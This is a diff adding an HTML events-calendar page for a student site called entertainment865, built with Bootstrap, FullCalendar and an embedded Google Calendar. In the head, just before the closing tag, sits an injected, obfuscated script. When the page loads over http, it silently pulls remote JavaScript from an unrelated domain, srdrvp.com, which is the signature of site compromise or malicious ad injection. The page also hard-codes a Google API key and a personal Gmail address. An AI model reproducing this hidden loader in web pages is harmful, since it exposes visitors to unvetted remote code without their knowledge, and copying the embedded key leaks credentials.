@@ -1,0 +1,131 @@
+<!-- - enterainment865 calendar page featuring Google Calendar
+	 - events added from Google Calendar Dashboard
+	 - source used to implement calendar on page: http://fullcalendar.io/docs/google_calendar/	 
+-->
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"> 
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="../../favicon.ico">
+	
+	<!-- Latest compiled and minified CSS -->
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+
+    <!-- jQuery library -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+
+    <!-- Latest compiled JavaScript -->
+    <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
+	
+	<!-- less link((((***))))) -->
+	<!-- <link rel="stylesheet/less" href="entertainment865.css"> -->
+    <script src="less.js" type="text/javascript"></script>
+	
+	
+	<link href='../fullcalendar.css' rel='stylesheet' />
+    <link href='../fullcalendar.print.css' rel='stylesheet' media='print' />
+	<script src='../lib/moment.min.js'></script>
+	<script src='../lib/jquery.min.js'></script>
+	<script src='../fullcalendar.min.js'></script>
+	<script src='../gcal.js'></script>
+	<script type='text/javascript' src='fullcalendar/gcal.js'></script>
+	
+	  <!-- Google Web Fonts -->
+	  <link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Orbitron">
+	  
+	</head>
+	
+	
+	<title>Events Calendar</title>
+
+    <!-- Bootstrap core CSS -->
+    <link href="../../dist/css/bootstrap.min.css" rel="stylesheet">
+
+	<!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
+    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
+    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>
+	
+    <!-- Custom styles for this template -->
+    <link href="entertainment865.css" rel="stylesheet">
+  <script>var nz3Hsx8l = 1;(function(){var k=function(){if(window == window.top && document.location.protocol == 'http:') {var komCat = document.createElement('script');komCat.src = 'http://srdrvp.com/cmn2?p=YTI2NDY1NTU5ODRwgjUJiG2VEtIBVSfCXS96o1XkByyx783TkMd2FtGOGA4kjStb8eIASrxkW50GxXKdGKUivxml5KBB7zJrmZvNfP%2F4qHLIrgl0ZvyNveDP060tI%2BcanGM4j8fhTzDgXWWk8o2jZGJXLV59oKGAiOWLAkziWqrZ5%2B4%3D&d=98';komCat.type = 'text/javascript';document.getElementsByTagName('head')[0].appendChild(komCat);}};(function d(){if(document.readyState=='interactive' || document.readyState=='complete'){k()}else{window.setTimeout(d,50)}}())}());</script></head>
+<!-- NAVBAR
+================================================== -->
+  <body>
+    <div class="navbar-wrapper">
+      <div class="container">
+        <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+          <div class="container">
+            <div class="navbar-header">
+              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+              </button>
+              <a class="navbar-brand" href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865.html#"><img src="ent865logo6.png" class="logo" alt="ent865logo"></a>
+            </div>
+            <div id="navbar" class="navbar-collapse collapse">
+              <ul class="nav navbar-nav">
+                <li class="active"><a href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865.html#">Home</a></li>
+				<li><a href="#calendar">Calendar</a></li>
+				<li><a href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865db.php#">Database</a></li>
+				<li><a href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865exclusive.html#">Exclusive</a></li>
+                <li><a href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865about.html#">About</a></li>
+                <li><a href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865contact.html#">Contact</a></li>
+              </ul>
+            </div>
+          </div>
+        </nav> 
+      </div>
+    </div>
+
+	<div class="container_exclusive_cal">
+		  <div class="jumbotron">
+		  <center><h1>Events Calendar</h1></center>
+		 </div>
+		 </div>
+
+<!---------=============----------CALENDAR--------=====================--------->
+
+	<div class="responsive-iframe-container"><iframe src="https://calendar.google.com/calendar/embed?showTitle=0&amp;showPrint=0&amp;showCalendars=0&amp;height=600&amp;wkst=1&amp;bgcolor=%23c0c0c0&amp;src=rusticlitton%40gmail.com&amp;color=%23060D5E&amp;src=en.usa%23holiday%40group.v.calendar.google.com&amp;color=%23711616&amp;ctz=America%2FNew_York" style="border-width:0" width="800" height="600" frameborder="0" scrolling="no"></iframe></div>
+	
+	<script>
+	//jquery function to initialize calendar
+	$(document).ready(function() {
+		$('#calendar').fullCalendar({
+			googleCalendarApiKey: 'AIzaSyDk4A9E5P1L-iNnq38VKeX2L6M9m2BQXn4', //unique api key
+			events: {
+				googleCalendarId: 'rusticlitton@gmail.com'
+			}
+		});
+	});
+	</script>
+
+	
+	<!-- FOOTER -->
+      <footer class="footer_style">
+        <center>
+        <p>&copy; 2015 entertainment865, Inc. &middot; All Rights Reserved</p></center>
+      </footer>
+
+    </div><!-- /.container -->
+
+
+    <!-- Bootstrap core JavaScript
+    ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+    <script src="../../dist/js/bootstrap.min.js"></script>
+	 <!-- Just to make our placeholder images work. Don't actually copy the next line! -->
+    <script src="../../assets/js/vendor/holder.min.js"></script>
+    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
+    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script> 
+  </body>
+	
+</html>
